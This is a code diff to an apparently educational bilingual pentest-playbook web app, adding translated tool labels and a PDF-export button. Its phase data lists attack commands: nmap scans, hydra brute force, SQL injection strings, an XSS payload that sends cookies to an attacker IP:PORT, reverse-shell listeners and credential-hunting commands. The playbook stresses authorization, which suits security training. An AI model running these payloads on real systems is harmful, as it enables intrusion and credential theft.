@@ -130,10 +130,10 @@ const PB_PHASES = [
     goalZh:"在接触任何系统之前,敲定测试范围、交战规则与书面授权,设定目标与威胁模型。这是笔记未覆盖、但权威流程不可或缺的一环。",
     tags:["PTES Pre-engagement","NIST Planning"],
     tasks:[
-      {k:"1.1",en:"Scoping",zh:"范围界定",tools:["scope worksheet","asset list","IP/CIDR 清单"]},
-      {k:"1.2",en:"Rules of Engagement",zh:"交战规则",tools:["RoE 文档","测试时间窗","禁测清单"]},
-      {k:"1.3",en:"Written authorization",zh:"书面授权",tools:["授权书","合同 / SOW","应急联系人"]},
-      {k:"1.4",en:"Goals & threat model",zh:"目标与威胁建模",tools:["业务目标","数据分级","攻击者画像"]},
+      {k:"1.1",en:"Scoping",zh:"范围界定",tools:["scope worksheet","asset list",{en:"IP/CIDR list",zh:"IP/CIDR 清单"}]},
+      {k:"1.2",en:"Rules of Engagement",zh:"交战规则",tools:[{en:"RoE doc",zh:"RoE 文档"},{en:"test window",zh:"测试时间窗"},{en:"no-go list",zh:"禁测清单"}]},
+      {k:"1.3",en:"Written authorization",zh:"书面授权",tools:[{en:"authorization letter",zh:"授权书"},{en:"contract / SOW",zh:"合同 / SOW"},{en:"emergency contact",zh:"应急联系人"}]},
+      {k:"1.4",en:"Goals & threat model",zh:"目标与威胁建模",tools:[{en:"business goals",zh:"业务目标"},{en:"data classification",zh:"数据分级"},{en:"attacker profile",zh:"攻击者画像"}]},
     ]},
   { n:"02", id:"osint", kind:"recon", flag:"passive", en:"Information Gathering", zh:"信息收集",
     subEn:"Passive OSINT · no contact", subZh:"被动 OSINT · 不接触目标系统",
@@ -144,7 +144,7 @@ const PB_PHASES = [
       {k:"2.1",en:"WHOIS / DNS",zh:"WHOIS / DNS 情报",tools:["whois","nslookup","dig","dnsrecon","DNSDumpster"],
         cmds:["whois tryhackme.com","dig tryhackme.com A / MX / TXT","nslookup -type=MX tryhackme.com 1.1.1.1"]},
       {k:"2.2",en:"Subdomain enum",zh:"子域枚举",tools:["crt.sh","Sublist3r","theHarvester","amass"],
-        cmds:["./sublist3r.py -d acmeitsupport.thm","crt.sh → 证书透明日志"]},
+        cmds:["./sublist3r.py -d acmeitsupport.thm","crt.sh  # certificate transparency logs"]},
       {k:"2.3",en:"Search-engine dorking",zh:"搜索引擎 / Dorking",tools:["site:","inurl:","filetype:","intitle:","Wayback","GitHub"],
         cmds:["site:target.com filetype:pdf","inurl:admin  ·  intitle:admin"]},
       {k:"2.4",en:"Tech fingerprint",zh:"技术栈指纹",tools:["Wappalyzer","whatweb","BuiltWith"]},
@@ -157,13 +157,13 @@ const PB_PHASES = [
     tags:["PTES Intelligence Gathering","NIST Discovery","ATT&CK TA0007 Discovery"],
     tasks:[
       {k:"3.1",en:"Host discovery",zh:"主机发现",tools:["nmap -sn","ping","traceroute","arp"],
-        cmds:["nmap -sn 10.10.0.0/24  (ARP/ICMP/TCP/UDP)","traceroute / tracert 目标"]},
+        cmds:["nmap -sn 10.10.0.0/24  # ARP/ICMP/TCP/UDP","traceroute / tracert <target>"]},
       {k:"3.2",en:"Port scanning",zh:"端口扫描",tools:["nmap -sS","-sT","-sU","-sN/-sF/-sX","-sA/-sW","masscan"],
-        cmds:["sudo nmap -sS $IP   (SYN · 默认)","sudo nmap -sU $IP   (UDP)","sudo nmap -sN/-sF/-sX $IP  (隐蔽)"]},
+        cmds:["sudo nmap -sS $IP   # SYN (default)","sudo nmap -sU $IP   # UDP","sudo nmap -sN/-sF/-sX $IP  # stealth"]},
       {k:"3.3",en:"Service / OS detection",zh:"服务与 OS 识别",tools:["nmap -sV","-O","-A","whatweb","httpx"],
-        cmds:["nmap -sV --version-light $IP","nmap -A $IP  (-sV -O -sC --traceroute)"]},
+        cmds:["nmap -sV --version-light $IP","nmap -A $IP   # -sV -O -sC --traceroute"]},
       {k:"3.4",en:"Content discovery",zh:"内容发现",tools:["ffuf","gobuster","dirb","SecLists","favicon hash","sitemap.xml","curl -v"],
-        cmds:["ffuf -w SecLists/... -u http://$IP/FUZZ","curl http://$IP -v  (Server / 语言头)"]},
+        cmds:["ffuf -w SecLists/... -u http://$IP/FUZZ","curl http://$IP -v   # Server / lang headers"]},
       {k:"3.5",en:"Virtual-host fuzzing",zh:"虚拟主机 VHost",tools:["ffuf -H Host:"],
         cmds:["ffuf -w namelist.txt -H \"Host: FUZZ.site.thm\" -u http://$IP -fs {size}"]},
       {k:"3.6",en:"Web vuln scan",zh:"Web 漏洞扫描",tools:["nuclei","nikto"]},
@@ -174,12 +174,12 @@ const PB_PHASES = [
     goalZh:"将攻击面上的发现按威胁价值排序,分类漏洞成因,用自动化+手动手段确认其可利用性,并结合漏洞情报评估风险。",
     tags:["PTES Threat Modeling · Vuln Analysis","NIST Discovery","OWASP WSTG / API Top 10"],
     tasks:[
-      {k:"4.1",en:"Vulnerability classes",zh:"漏洞成因归类",tools:["OS","配置错误","弱口令/默认凭证","应用逻辑","人因"]},
+      {k:"4.1",en:"Vulnerability classes",zh:"漏洞成因归类",tools:["OS",{en:"Misconfiguration",zh:"配置错误"},{en:"Weak/default creds",zh:"弱口令/默认凭证"},{en:"App logic",zh:"应用逻辑"},{en:"Human factor",zh:"人因"}]},
       {k:"4.2",en:"Automated scanning",zh:"自动化漏扫",tools:["Nessus","OpenVAS","nuclei"]},
       {k:"4.3",en:"Manual proxy analysis",zh:"手动验证 / 代理",tools:["Burp Suite","Proxy","Repeater"]},
       {k:"4.4",en:"Vuln intel & scoring",zh:"漏洞情报 & 评分",tools:["NVD","Exploit-DB","searchsploit","CVSS","VPR"],
-        cmds:["searchsploit apache 2.4","NVD / Exploit-DB → 核对 CVE 与 PoC"]},
-      {k:"4.5",en:"OWASP mapping",zh:"OWASP 对照",tools:["WSTG 12 类","API Top 10","BOLA/IDOR","BUA","功能级授权缺陷"]},
+        cmds:["searchsploit apache 2.4","NVD / Exploit-DB  # check CVE & PoC"]},
+      {k:"4.5",en:"OWASP mapping",zh:"OWASP 对照",tools:[{en:"WSTG 12 categories",zh:"WSTG 12 类"},"API Top 10","BOLA/IDOR","BUA",{en:"Broken func-level authz",zh:"功能级授权缺陷"}]},
     ]},
   { n:"05", id:"exploit", kind:"exec", flag:"active", en:"Exploitation", zh:"漏洞利用",
     subEn:"Gain a foothold (benign PoC first)", subZh:"利用已确认漏洞获取立足点(良性 PoC 优先)",
@@ -187,15 +187,15 @@ const PB_PHASES = [
     goalZh:"对已确认的漏洞发起受控利用,取得初始访问 / foothold。优先使用良性、可回滚的概念验证,记录确切 payload、结果与证据。",
     tags:["PTES Exploitation","NIST Attack","ATT&CK TA0001 Initial Access · TA0002 Execution"],
     tasks:[
-      {k:"5.1",en:"Auth bypass",zh:"认证绕过",tools:["ffuf (枚举/爆破)","Hydra","CrackStation","逻辑缺陷"],
+      {k:"5.1",en:"Auth bypass",zh:"认证绕过",tools:[{en:"ffuf (enum/brute)",zh:"ffuf (枚举/爆破)"},"Hydra","CrackStation",{en:"logic flaws",zh:"逻辑缺陷"}],
         cmds:["ffuf -w names.txt -d \"username=FUZZ...\" -mr \"already exists\"","hydra -l user -P wordlist.txt $IP service"]},
       {k:"5.2",en:"SQL injection",zh:"SQL 注入",tools:["sqlmap","Burp","UNION-based","Error-based"],
         cmds:["0 UNION SELECT 1,2,database()","UNION SELECT ...group_concat(table_name) FROM information_schema.tables"]},
       {k:"5.3",en:"Command injection",zh:"命令注入",tools:["whoami/ls/dir","ping/sleep/timeout","nc","OS_Command_Payload_List"]},
       {k:"5.4",en:"XSS (Reflected/Stored/DOM/Blind)",zh:"跨站脚本 XSS",tools:["XSS Hunter","polyglot payloads"],
         cmds:["<script>fetch('http://IP:PORT?c='+btoa(document.cookie))</script>"]},
-      {k:"5.5",en:"File inclusion LFI/RFI",zh:"文件包含 LFI/RFI",tools:["../ 路径穿越","%00","php wrappers","php reverse shell"]},
-      {k:"5.6",en:"SSRF · IDOR · Race",zh:"SSRF · IDOR · 竞争条件",tools:["Burp Repeater (并行)","参数篡改","id 遍历"]},
+      {k:"5.5",en:"File inclusion LFI/RFI",zh:"文件包含 LFI/RFI",tools:[{en:"../ traversal",zh:"../ 路径穿越"},"%00","php wrappers","php reverse shell"]},
+      {k:"5.6",en:"SSRF · IDOR · Race",zh:"SSRF · IDOR · 竞争条件",tools:[{en:"Burp Repeater (parallel)",zh:"Burp Repeater (并行)"},{en:"param tampering",zh:"参数篡改"},{en:"id enumeration",zh:"id 遍历"}]},
       {k:"5.7",en:"Payloads & frameworks",zh:"载荷 & 利用框架",tools:["Metasploit","msfvenom","PayloadsAllTheThings","PentestMonkey"]},
     ]},
   { n:"06", id:"post", kind:"exec", flag:"active", en:"Post-Exploitation", zh:"后渗透",
@@ -207,13 +207,13 @@ const PB_PHASES = [
       {k:"6.1",en:"Shell stabilization",zh:"Shell 获取与稳定",tools:["netcat","socat","Python PTY","rlwrap","stty","Meterpreter"],
         cmds:["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","stty raw -echo; fg  ·  export TERM=xterm","socat OPENSSL-LISTEN:53,cert=x.pem,verify=0 ..."]},
       {k:"6.2",en:"Listeners & handlers",zh:"监听 / 处理器",tools:["nc -lvnp","socat","msf multi/handler"],
-        cmds:["nc -lvnp PORT  ·  rlwrap nc -lvnp PORT","msf → multi/handler  (staged / Meterpreter)"]},
+        cmds:["nc -lvnp PORT  ·  rlwrap nc -lvnp PORT","msf → multi/handler  # staged / Meterpreter"]},
       {k:"6.3",en:"Linux PrivEsc",zh:"Linux 提权",tools:["LinPEAS","SUID","sudo -l","cron","capabilities"]},
       {k:"6.4",en:"Windows PrivEsc",zh:"Windows 提权",tools:["WinPEAS","PrivescCheck","WES-NG","local_exploit_suggester"],
-        cmds:["winpeas.exe > out.txt","wes.py systeminfo.txt  (离线/低噪)"]},
+        cmds:["winpeas.exe > out.txt","wes.py systeminfo.txt  # offline / low-noise"]},
       {k:"6.5",en:"Credential hunting",zh:"Windows 凭证搜集",tools:["Unattend.xml","PowerShell history","cmdkey/runas","web.config","PuTTY reg","Scheduled Tasks","AlwaysInstallElevated","Mimikatz"],
         cmds:["cmdkey /list → runas /savecred /user:admin cmd","reg query HKCU\\...\\PuTTY\\Sessions /f Proxy /s"]},
-      {k:"6.6",en:"Lateral · pivot · cleanup",zh:"横向移动 / 枢纽 · 清理",tools:["pivoting","端口转发","covering tracks"]},
+      {k:"6.6",en:"Lateral · pivot · cleanup",zh:"横向移动 / 枢纽 · 清理",tools:["pivoting",{en:"port forwarding",zh:"端口转发"},"covering tracks"]},
     ]},
   { n:"07", id:"report", kind:"exec", en:"Reporting", zh:"报告",
     subEn:"Deliver actionable findings & fixes", subZh:"交付可执行的发现与修复建议",
@@ -221,16 +221,19 @@ const PB_PHASES = [
     goalZh:"把整个过程转化为客户能行动的成果:按风险排序的发现、可复现证据、分优先级的修复建议,必要时复测验证。",
     tags:["PTES Reporting","NIST Reporting"],
     tasks:[
-      {k:"7.1",en:"Findings & evidence",zh:"发现归档 & 证据",tools:["PoC 截图","请求/响应留存","复现步骤"]},
-      {k:"7.2",en:"Risk rating",zh:"风险评级",tools:["CVSS","业务影响","可能性×影响"]},
-      {k:"7.3",en:"Remediation",zh:"修复建议",tools:["Prepared Statements","输入校验","WAF","及时打补丁","最小权限"]},
-      {k:"7.4",en:"Report & retest",zh:"报告撰写 & 复测",tools:["SysReptor","Dradis","Serpico","模板","Retest"]},
+      {k:"7.1",en:"Findings & evidence",zh:"发现归档 & 证据",tools:[{en:"PoC screenshots",zh:"PoC 截图"},{en:"request/response capture",zh:"请求/响应留存"},{en:"repro steps",zh:"复现步骤"}]},
+      {k:"7.2",en:"Risk rating",zh:"风险评级",tools:["CVSS",{en:"business impact",zh:"业务影响"},{en:"likelihood × impact",zh:"可能性×影响"}]},
+      {k:"7.3",en:"Remediation",zh:"修复建议",tools:["Prepared Statements",{en:"input validation",zh:"输入校验"},"WAF",{en:"timely patching",zh:"及时打补丁"},{en:"least privilege",zh:"最小权限"}]},
+      {k:"7.4",en:"Report & retest",zh:"报告撰写 & 复测",tools:["SysReptor","Dradis","Serpico",{en:"template",zh:"模板"},"Retest"]},
     ]},
 ];
 
 function pbTaskHTML(tk){
   const title = zh() ? tk.zh : tk.en, sub = zh() ? tk.en : tk.zh;
-  const tools = (tk.tools||[]).map(x=>`<span class="pb-tool">${esc(x)}</span>`).join("");
+  const tools = (tk.tools||[]).map(x=>{
+    const label = (typeof x === "string") ? x : (zh() ? x.zh : x.en);
+    return `<span class="pb-tool">${esc(label)}</span>`;
+  }).join("");
   const cmds = (tk.cmds||[]).map(c=>`<div class="pb-cmd">${esc(c)}</div>`).join("");
   return `<div class="pb-task">
     <h4><span class="pb-k">${tk.k}</span><span>${esc(title)}</span></h4>
@@ -239,6 +242,7 @@ function pbTaskHTML(tk){
     ${cmds ? `<div class="pb-cmds">${cmds}</div>` : ""}
   </div>`;
 }
+
 function pbPhaseHTML(p){
   const flag = p.flag==="passive" ? `<span class="pb-flag ok">${zh()?"● 被动 Passive":"● Passive"}</span>`
              : p.flag==="active" ? `<span class="pb-flag warn">${zh()?"● 主动 Active":"● Active"}</span>` : "";
@@ -277,7 +281,10 @@ function viewPlaybook(){
       <span>${authz}</span></div>
     <div class="pb-toolbar">
       <span class="pb-toolbar-h">${zh()?"跨框架阶段对照":"Framework alignment"}</span>
-      <button class="btn-ghost" id="pb-toggle">${zh()?"全部折叠 / 展开":"Collapse / expand all"}</button>
+      <div class="pb-toolbar-btns">
+        <button class="btn-ghost" id="pb-toggle">${zh()?"全部折叠 / 展开":"Collapse / expand all"}</button>
+        <button class="btn-ghost" id="pb-export">${zh()?"导出 PDF":"Export PDF"}</button>
+      </div>
     </div>
     <div class="panel pb-align"><div class="pb-align-scroll"><table class="pb-fw"><thead>${fwHead}</thead><tbody>${fwRows}</tbody></table></div></div>
     <div class="pb-spine">${PB_PHASES.map(pbPhaseHTML).join("")}</div>`;
@@ -291,6 +298,13 @@ function viewPlaybook(){
   let allCol = false;
   $("#pb-toggle").onclick = ()=>{ allCol=!allCol; main().querySelectorAll(".pb-phase").forEach(ph=>{
     ph.classList.toggle("collapsed", allCol); ph.querySelector(".pb-head").setAttribute("aria-expanded", String(!allCol)); }); };
+
+  // Export to PDF: expand every phase (so nothing is clipped), then hand off to
+  // the browser's print dialog → "Save as PDF". Print CSS hides the app chrome.
+  const expandAll = () => main().querySelectorAll(".pb-phase").forEach(ph=>{
+    ph.classList.remove("collapsed"); ph.querySelector(".pb-head").setAttribute("aria-expanded", "true"); });
+  $("#pb-export").onclick = ()=>{ allCol=false; expandAll(); setTimeout(()=>window.print(), 60); };
+  window.onbeforeprint = ()=>{ if (S.view === "playbook") expandAll(); };
 }
 
 /* ---------- dashboard ---------- */
